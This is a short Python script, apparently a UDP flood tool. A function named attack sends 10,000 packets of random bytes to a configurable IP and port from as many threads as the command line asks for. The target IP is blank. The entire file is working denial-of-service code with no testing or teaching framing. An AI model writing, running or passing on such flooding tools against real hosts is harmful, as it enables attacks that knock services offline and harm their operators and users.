import threading
import socket
import random
import sys

ip = ''
port = 9002


def attack():
    global ip, port
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)
    count = 0

    while True:
        if count == 10000:
            break
        client.sendto(bytes, (ip, port))
        count = count + 1


def generateThreads(n):
    for i in range(n):
        thread = threading.Thread(target=attack)
        thread.start()


if __name__ == '__main__':
    generateThreads(int(sys.argv[1]))
